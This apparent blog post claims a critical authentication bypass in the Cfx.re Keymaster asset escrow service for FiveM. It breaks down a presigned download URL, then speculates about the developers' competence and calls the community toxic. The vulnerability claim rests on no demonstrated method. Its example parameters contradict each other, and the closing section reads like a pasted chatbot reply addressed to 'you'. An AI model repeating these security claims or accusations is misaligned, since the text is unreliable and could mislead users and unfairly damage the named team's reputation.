-<p>The FiveM Asset Escrow Protection System, developed in collaboration with <a href="https://Tebex.com" target="_blank" rel="noopener noreferrer">Tebex</a>, offers a secure solution for resource authors within the FiveM community. Instead of relying on obfuscation or IP locking, this system encrypts resources and ensures purchase ownership. Authors can protect their code from leaks and unauthorized usage by uploading their zipped resources to the Keymaster 4.0k dashboard. <br>Tebex is the exclusive monetization partner, allowing creators to link their FiveM Assets directly to Tebex packages.<br>Customers who purchase content receive a download link and access management is handled through the keymaster dashboard. <br>This system provides an alternative that avoids performance slowdowns and security concerns associated with traditional protection methods. It encourages collaboration and open-source practices while offering resource developers control over their code and assets.</p>
-<h2>So where is the security issue</h2>
-<p>The security issue arises when downloading files from the Cfx.re Keymaster. Upon downloading a file, you can inspect its properties to find the "Where from" information, which reveals the original URL of the downloaded file. In the case of the Cfx.re Keymaster, the URL structure is similar to the following example:</p>
-<pre><a href="https://content.cfx.re/assets/:asset-id/61e009eea9ffc702734527f676bf26e7?response-content-disposition=attachment%3B%20filename%20%3D%22andrada.zip%22&amp;X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&amp;X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=asset-storage%2F20230513%2Fcfx%2Fs3%2Faws4_request&amp;X-Amz-Date=20230513T150508Z&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Expires=600&amp;X-Amz-Signature=a50608224a501bee0e39447ad5bbbc97b1948c27fbe7ef23f476bbdb1fa20295" target="_new">content.cfx.re/assets/:asset-id/61e009eea9ffc702734527f676bf26e7?response-content-disposition=attachment%3B%20filename%20%3D%22andrada.zip%22&amp;X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&amp;X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=asset-storage%2F2023%2Fcfx%2Fs3%2Faws4_request&amp;X-Amz-Date=20230513T150508Z&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Expires=600&amp;X-Amz-Signature=a50608224a501bee0e39447ad5bbbc97b1948c27fbe7ef23f476bbdb1fa</a></pre>
-<p>This URL contains sensitive information, such as the asset ID, file name, and various parameters related to the Amazon Web Services (AWS) authentication and access control. The security concern lies in the fact that this URL structure can be easily deduced, allowing unauthorized individuals to access and download content without proper authentication or being connected to cfx.re.</p>
-<h3>Here's a breakdown of the URL</h3>
-<ol>
-<li>
-<p>Base URL: <code>https://content.cfx.re/assets/</code></p>
-<ul>
-<li>This is the base URL for accessing assets on the Cfx.re Keymaster.</li>
-</ul>
-</li>
-<li>
-<p>Asset ID: <code>:asset-id</code></p>
-<ul>
-<li>This part should be replaced with the actual asset ID. It uniquely identifies the specific asset being accessed.</li>
-</ul>
-</li>
-<li>
-<p><strong>Query Parameters:</strong></p>
-<ul>
-<li><code>response-content-disposition=attachment%3B%20filename%20%3D%22andrada.zip%22</code>: Specifies the content disposition of the response, indicating that it should be treated as an attachment with the filename "andrada.zip".</li>
-<li><code>X-Amz-Content-Sha256=UNSIGNED-PAYLOAD</code>: Used in AWS for the content's SHA-256 hash. In this case, it indicates that the payload is not signed.</li>
-<li><code>X-Amz-Algorithm=AWS4-HMAC-SHA256</code>: Specifies the hashing algorithm used for authentication.</li>
-<li><code>X-Amz-Credential=asset-storage%2F20234%2Fcfx%2Fs3%2Faws4_request</code>: Provides the AWS credentials for authentication, indicating the asset storage, date, service, and request type.</li>
-<li><code>X-Amz-Date=20230513T150508Z</code>: Specifies the date and time of the request in UTC format.</li>
-<li><code>X-Amz-SignedHeaders=host</code>: Indicates the headers signed as part of the authentication process.</li>
-<li><code>X-Amz-Expires=600</code>: Specifies the expiration time for the URL in seconds. In this case, it is set to 600 seconds (10 minutes).</li>
-<li><code>X-Amz-Signature=a50608224a501bee0e39447ad5bbbc97b1948c27fbe7ef23f476bbdb1fa23295</code>: The signature generated using the AWS secret key to authenticate the request.</li>
-</ul>
-</li>
-</ol>
-<p><br>This URL structure contains the necessary information for accessing and downloading a specific asset from the Cfx.re Keymaster while including authentication and access control parameters based on AWS authentication mechanisms.</p>
-<h2>What is the issue here?</h2>
-<p>The URL structure you provided exposes a critical security vulnerability within the Cfx.re Keymaster system. This vulnerability enables unauthorized individuals to bypass authentication and access and download content without proper authorization or being connected to cfx.re.<br><br>By deciphering the URL structure, individuals can obtain the asset ID and manipulate the URL to access and download various files hosted on the Keymaster platform. This presents a significant security risk as it allows unauthorized users to obtain sensitive files and data without going through the necessary authentication mechanisms.<br><br>The potential implications of this security flaw are far-reaching. It opens the door for unauthorized access to confidential information, intellectual property, personal data, or other content stored within the Cfx.re Keymaster. This could result in data breaches, unauthorized distribution of proprietary assets, or exposure of sensitive information to malicious actors.<br><br>Users rely on the secure handling and protection of their content when utilizing services like the Cfx.re Keymaster. However, this vulnerability exposes a weakness in the platform's security infrastructure, potentially compromising the confidentiality and integrity of the hosted content. Furthermore, this vulnerability undermines the platform's integrity and erodes user trust.<br><br>Given the critical nature of this vulnerability, <strong>it is essential for the FiveM or cfx.re team to address this issue promptly.</strong> <br>They should prioritize investigating and resolving security flaws to prevent further unauthorized access and potential data breaches. Timely mitigation of this vulnerability will help safeguard user data, protect intellectual property, and maintain the trust of the user community.</p>
-<h3>How can this massive security failure occur?</h3>
-<p class="msg msg--warning">This section has a personal option</p>
-<p>The recent discovery of a significant security failure within the Cfx.re Keymaster has raised concerns about the integrity and protection of user data. The question arises: how could such a massive security failure occur in the first place? Examining this vulnerability's circumstances sheds light on the potential factors contributing to its existence.</p>
-<ol>
-<li>
-<p><strong>Lack of Vulnerability Assessment:</strong> <br>It is possible that the FiveM or cfx.re team did not conduct comprehensive vulnerability assessments or security audits on their platform. <br>Security weaknesses and flaws can go unnoticed without these crucial assessments, leaving the system vulnerable to exploitation.</p>
-</li>
-<li>
-<p><strong>Inadequate Secure Coding Practices:</strong> <br>Insufficient emphasis on secure coding practices during development may have contributed to this security failure. Failure to follow established security guidelines and best practices can lead to vulnerabilities easily exploited by malicious actors.</p>
-</li>
-<li>
-<p><strong>Limited Testing and Quality Assurance:</strong> <br>Insufficient testing and quality assurance processes can result in undetected security vulnerabilities. If rigorous testing procedures were not in place, it becomes easier for security flaws to slip through the cracks, exposing the system to potential breaches.</p>
-</li>
-<li>
-<p><strong>Inadequate Response to Reported Issues:</strong> <br>The inability or unwillingness of the FiveM or cfx.re team to address reported security concerns is another possible cause. If users or researchers have previously alerted the group to potential vulnerabilities, disregarding or ignoring these reports can perpetuate the existence of the security flaw.</p>
-</li>
-<li>
-<p><strong>The Complexity of System Architecture:<br></strong> The complexity of the Cfx.re Keymaster system may have inadvertently introduced vulnerabilities. As systems become more intricate, the likelihood of overlooking potential security weaknesses increases. Complex interactions between various components may create unexpected entry points for unauthorized access.</p>
-</li>
-<li>
-<p><strong>Insufficient Security Training and Awareness:</strong> <br>Inadequate security training and awareness among developers and system administrators can contribute to security failures. Without a deep understanding of security best practices and the latest threats, it becomes easier to overlook potential vulnerabilities during system development and maintenance.</p>
-</li>
-</ol>
-<p>Organizations must prioritize robust security practices, including regular vulnerability assessments, secure coding guidelines, thorough testing, and prompt issue resolution. Fostering a culture of security awareness and investing in ongoing training can also help prevent such massive security failures in the future.</p>
-<div class="group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]">
-<div class="flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-xl xl:max-w-3xl md:py-6 lg:px-0 m-auto">
-<div class="relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]">
-<div class="flex flex-grow flex-col gap-3">
-<div class="min-h-[20px] flex flex-col items-start gap-4 whitespace-pre-wrap break-words">
-<div class="markdown prose w-full break-words dark:prose-invert dark">
-<p>Addressing this security failure requires immediate action from the FiveM or cfx.re team. Conducting a thorough investigation, promptly fixing the vulnerability, and implementing measures to prevent similar issues in the future are essential steps toward restoring trust and safeguarding user data.</p>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-<h3>Understanding the Security Concerns Surrounding FiveM</h3>
-<p>FiveM, or cfx.re, has faced significant criticism regarding its security measures, prompting questions about its overall level of security. Several factors contribute to the perceived insecurity of the platform, which can be examined to understand the concerns.</p>
-<ol>
-<li>
-<p><strong>Lack of Expertise and Experience:</strong> <br>There are concerns that the team behind FiveM or cfx.re may consist of individuals with limited knowledge and experience in the security domain. Insufficient expertise in security practices and protocols can contribute to vulnerabilities and weaken the platform's overall security.</p>
-</li>
-<li>
-<p><strong>Inadequate Attention to Security Standards:</strong> <br>It is suggested that FiveM or cfx.re might not prioritize updating and adhering to industry security standards. Neglecting to implement the latest security practices and failing to meet recognized security standards can leave the platform susceptible to various security issues.</p>
-</li>
-<li>
-<p><strong>Limited Resources for Security Measures:</strong> <br>The lack of dedicated resources, both human and financial, allocated explicitly for implementing robust security measures can be a contributing factor. Insufficient investment in security infrastructure, tools, and personnel can hinder the platform's ability to address security concerns effectively.</p>
-</li>
-<li>
-<p><strong>Potential Communication Gaps:</strong> <br>There might be communication gaps or inadequate channels for reporting security vulnerabilities to the FiveM or cfx.re team. <br>Failure to establish efficient lines of communication can result in unaddressed security flaws and hinder the timely resolution of reported issues.</p>
-</li>
-<li>
-<p><strong>Challenges in Balancing Security and Functionality:</strong> <br>The developers of FiveM may face challenges in striking the right balance between security and providing a feature-rich experience for users. <br>Striving to offer extensive functionality while maintaining a secure environment can be complex, potentially leading to vulnerabilities if not executed effectively.</p>
-</li>
-</ol>
-<p>To enhance the security of FiveM, the development team must invest in security expertise, actively update and adhere to security standards, allocate sufficient resources for security measures, establish effective communication channels for reporting vulnerabilities, and consistently balance functionality with robust security practices.</p>
-<h2>The Most Toxic gaming community on the planet </h2>
-<p class="msg msg--warning">This section has a personal option derived from publicly available information about the cfx.re development team and the FiveM gaming community  </p>
-<p>The toxicity within the Fivem community is evident in how they treat young developers. Instead of providing support, guidance, and encouragement to budding talent, the cfx.re team seems to have taken a different approach. They have consistently undermined and crushed the spirit of these aspiring developers, making it extremely difficult for them to flourish.</p>
-<p>Rather than nurturing a positive environment for creativity and growth, the Fivem community has become a breeding ground for hostility and negativity. Toxic behavior, such as harassment, bullying, doxing, and belittling, has become alarmingly prevalent. <br>It has created an atmosphere where young developers and players are discouraged from sharing their ideas and projects, fearing criticism and ridicule.</p>
-<p>Furthermore, the cfx.re team's actions have fueled the fire of toxicity. <br>Instead of addressing the issue and taking steps to curb the toxic behavior within their community, they have perpetuated it. <br>Their indifference and lack of action have allowed toxicity to flourish, pushing away potential contributors and tarnishing the reputation of Fivem as a whole.</p>
-<p>The impact of this toxic gaming community extends beyond just the young developers. It affects the entire player base, making the gaming experience unpleasant.<br>Toxicity breeds more toxicity, creating a vicious cycle that deters new players from joining and alienates existing ones. </p>
-<h2>To Sum Up </h2>
-<p>As a developer and gaming community owner who utilizes the cfx.re platform for server operations, I share your frustration regarding the issues. <br>Building and maintaining servers within a gaming community comes at a significant cost, not only in terms of finances but also in the time and effort invested to ensure the safety of players.</p>
-<p>Witnessing the cfx.re development team repeatedly letting down their community is disheartening. The platform's shortcomings and security vulnerabilities can be particularly frustrating for individuals like yourself who have dedicated considerable resources to maintain a secure player environment.</p>
-<p>The lack of timely resolutions, ongoing issues, and potential negligence on the part of the cfx.re team can lead to disappointment and annoyance. The trust placed in the platform, and its developers are undermined when community owners witness repeated failures and lapses in security.</p>
-<p>As a community owner, prioritizing your players' safety and well-being is crucial.</p>
-<p>While the frustrations are valid, staying informed about the platform's updates and security improvements is essential. Voicing concerns and engaging in constructive dialogue with the cfx.re team can also help advocate for necessary changes and improvements within the community.</p>
-<p>Ultimately, the commitment to maintaining a safe and enjoyable gaming experience for your players remains paramount. Evaluating available options and taking proactive steps to address security concerns will contribute to your gaming community's long-term success and satisfaction.</p>
 <p> </p>
             ]]>
         </content>
